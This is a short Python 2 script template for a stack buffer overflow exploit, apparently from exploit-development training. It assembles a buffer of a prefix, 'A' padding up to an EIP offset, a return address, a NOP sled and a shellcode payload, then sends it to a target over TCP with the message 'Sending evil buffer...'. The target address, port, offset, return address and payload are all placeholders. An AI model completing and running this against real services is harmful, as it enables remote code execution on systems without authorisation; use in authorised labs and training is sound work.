#!/usr/bin/python

import socket

ip = "host_addr"
port = host_port
prefix = "prefix_here "
offset = eip_offset
overflow = "A" * offset
retn = "esp_addr"
padding = "\x90" * 16
payload = "payload_here"

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print "Sending evil buffer..."
    s.send(buffer + "\r\n")
    print "Done!"
except:
    print "Could not connect."
